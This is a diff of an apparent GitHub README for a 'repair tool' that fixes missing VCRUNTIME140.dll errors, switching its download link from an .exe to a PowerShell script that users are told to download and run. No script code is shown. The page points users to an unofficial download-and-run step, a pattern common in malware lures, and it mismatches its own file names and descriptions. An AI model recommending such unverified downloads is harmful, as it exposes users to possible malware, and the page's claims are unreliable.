@@ -21,15 +21,41 @@ These errors usually appear when required system components from the **Microsoft
 
 ---
 
-## ✅ Quick Fix – Download the EXE Repair Tool
+## ✅ Quick Fix – Download the PS1 Repair Tool
 
-We created a one‑click `.exe` tool that:
 
-- Checks if `VCRUNTIME140.dll` and `MSVCP140.dll` are missing  
-- Automatically downloads and installs the correct Visual C++ Redistributables (x64 & x86)  
-- Prompts you to reboot  
+  🛠 What the Script Fixes
 
-📥 [Download Fix‐MissingDLLs.exe](https://github.com/VCRUNTIME140dll/vcruntime140-dll-and-msvcp140-dll-missing-in-windows-10-11/releases/latest/download/Fix-VCRUNTIME140.exe)
+The VCRUNTIME140.dll is missing error happens when your system is missing or has a corrupted Visual C++ runtime file that’s required by many apps and games.
+
+🔧 This script will:
+
+Check if VCRUNTIME140.dll exists in:
+
+C:\Windows\System32
+
+C:\Windows\SysWOW64
+
+If missing, it will download official Visual C++ Redistributables (from Microsoft):
+
+vc_redist.x64.exe
+
+vc_redist.x86.exe
+
+Silently install them in the background using:
+
+/quiet /norestart
+
+▶️ How to Run the .ps1 Script
+- Right-click Fix-VCRUNTIME140.ps1
+- Choose "Run with PowerShell"
+- Wait for it to complete
+- Restart your computer
+
+
+Prompt you to restart your PC once the fix is complete.
+
+📥 [Download Fix‐MissingDLLs.ps1](https://github.com/VCRUNTIME140dll/vcruntime140-dll-and-msvcp140-dll-missing-in-windows-10-11/releases/download/v1.0.1/Fix-VCRUNTIME140.ps1)
 
 > This executable is compiled from a readable PowerShell script. See [Fix‑MissingDLLs.ps1](./Fix‑MissingDLLs.ps1) to verify the source code.
 
